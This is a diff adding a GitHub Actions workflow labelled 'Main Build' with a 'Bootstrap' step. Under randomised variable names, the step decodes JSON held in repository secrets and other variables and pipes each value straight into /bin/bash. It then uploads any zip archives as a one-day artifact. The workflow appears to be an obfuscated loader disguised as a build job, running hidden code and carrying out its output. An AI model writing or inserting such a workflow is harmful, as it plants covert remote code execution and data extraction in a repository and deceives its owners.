@@ -1,0 +1,30 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          e839: ${{ secrets.e839 }}
+        run: |
+          printf '%s' "$e839" | jq -r .bcmf9364 | /bin/bash
+          echo $zg5 | jq -r .jlrg5 | /bin/bash
+          printf '%s' "$ztnms3" | jq -r .epek6551 | /bin/bash
+          printf '%s' "$o65" | jq -r .p07 | /bin/bash
+          echo $gs8 | jq -r .hrwvf6318 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wIpULJCJ
+          path: "*.zip"
+          retention-days: 1
